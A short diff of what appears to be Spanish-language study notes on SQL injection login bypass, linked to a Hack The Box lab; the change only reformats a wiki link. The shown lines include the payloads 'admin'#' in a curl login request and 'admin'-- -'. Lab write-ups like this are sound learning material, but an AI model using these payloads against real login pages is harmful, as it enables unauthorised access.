@@ -87,7 +87,7 @@ curl -s -X POST http://<IP>/login.php -d "username=admin'#&password=x" -L
 
 ## Dónde la usé
 
-- `[[HTB/Appointment/Appointment]]` — Bypass con `admin'-- -`, flag obtenida directamente del response post-login
+- [[HTB/Appointment/Appointment]] — Bypass con `admin'-- -`, flag obtenida directamente del response post-login
 
 ---
 
